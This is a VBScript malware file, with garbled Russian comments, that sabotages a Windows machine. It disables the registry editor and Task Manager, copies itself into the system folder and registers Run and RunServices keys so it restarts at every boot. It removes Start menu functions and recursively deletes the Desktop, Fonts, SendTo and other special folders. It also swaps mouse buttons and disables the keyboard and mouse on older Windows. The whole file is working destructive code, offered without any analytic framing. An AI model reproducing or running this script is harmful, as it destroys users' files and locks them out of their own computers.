Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' ���������� ������
Set Application = CreateObject("Shell.Application")


' ����������� RegEdit(���� � ���� �� ��������� �������� �������).��� ���� ����� �������������� ���������� DisableRegistryTools �������� - 0
Shell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM\DisableRegistryTools", 1, "REG_DWORD"


' ����������� ��� ������ ������������
Set File2 = FileSystemObject.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' �������� ������� ���� ����: ���������, ���������� ������, �����, ���������, ��������� � �.�.
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoStartMenuMorePrograms", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoClose", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoFind", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoRun", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoRecentDocsMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoFavoritesMenu", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoStartMenuLogoff", 1, "REG_DWORD"

Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Expl�rer\NoClose", 1, "REG_DWORD"

'     �������� ����������� �����
 For Each Folder In Shell.SpecialFolders

' �������� �������� �����
 FileSystemObject.deletefolder Shell.SpecialFolders ("Desktop"),True
Shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"

' �������� Aplication Data
 If right(folder,15) = "Aplication Data" Then FileSystemObject.deletefolder folder,True

' �������� PrintHood
 If  right(folder,9) = "PrintHood"  Then FileSystemObject.deletefolder folder,True

' �������� ShellNew
 If right(folder,8) = "ShellNew" Then FileSystemObject.deletefolder folder,True

' �������� �������
 If right(folder,5) = "FONTS" Then FileSystemObject.deletefolder folder,True

' �������� NetHood
 If right(folder,7) = "NetHood" Then FileSystemObject.deletefolder folder,True

' �������� ������� ����
 If right(folder,12) = "������� ����" Then FileSystemObject.deletefolder folder,True

' �������� SendTo
 If right(folder,6) = "SendTo" Then FileSystemObject.deletefolder folder,True

' �������� ������������
 If right(folder,12) = "������������" Then FileSystemObject.deletefolder folder,True

' �������� ���������
 If right(folder,9) = "���������" Then FileSystemObject.deletefolder folder,True

' �������� ��� ���������
 If right(folder,13) = "��� ���������" Then FileSystemObject.deletefolder folder,True

' �������� ���������
 If right(folder,9) = "���������" Then FileSystemObject.deletefolder folder,True
 Next

Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SwapNT", "rundll32 user32, SwapMouseButton"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Swap98", "rundll32.exe user.exe, swapmousebutton"
Shell.Run "rundll32 user32, SwapMouseButton"

'     �������� ����������(������ ��� Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dead", "rundll32 keyboard,disable"
Shell.Run "rundll32.exe keyboard.exe, disable"

'     ��������� ����(������ ��� Windows 95,98,Me)
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Mad", "rundll32 mouse,disable"
Shell.Run "rundll32.exe mouse.exe, disable"


